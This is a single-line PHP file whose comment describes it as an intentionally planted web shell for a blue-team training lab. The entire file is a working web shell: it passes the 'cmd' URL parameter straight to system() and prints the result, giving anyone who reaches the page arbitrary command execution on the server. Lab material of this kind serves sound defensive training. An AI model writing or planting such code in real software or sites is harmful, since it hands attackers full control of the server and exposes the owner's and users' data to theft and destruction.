<?php /* CLPE training artefact: intentionally planted web shell for the blue-team lab. */ if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>
